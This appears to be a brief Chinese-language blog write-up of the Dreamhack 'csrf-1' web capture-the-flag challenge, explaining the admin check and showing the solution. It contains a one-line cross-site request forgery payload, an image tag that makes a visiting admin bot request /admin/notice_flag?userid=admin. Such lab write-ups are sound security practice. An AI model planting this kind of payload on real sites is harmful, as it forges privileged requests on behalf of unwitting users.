---
title: "csrf-1"
pubDatetime: 2025-02-20T00:00:00Z
description: "Dreamhack"
tags: ["Dreamhack",  "Web"]
parentPost: "dreamhack"
draft: false
---

# csrf-1

這次是會檢查透過 bot 進入到 `/admin/notice_flag` 頁面的參數有沒有包含 userid = "admin"

```javascript
<img src="/admin/notice_flag?userid=admin">
```

得到 flag

![flag](../../../assets/images/blog/dreamhack/csrf/image.png)
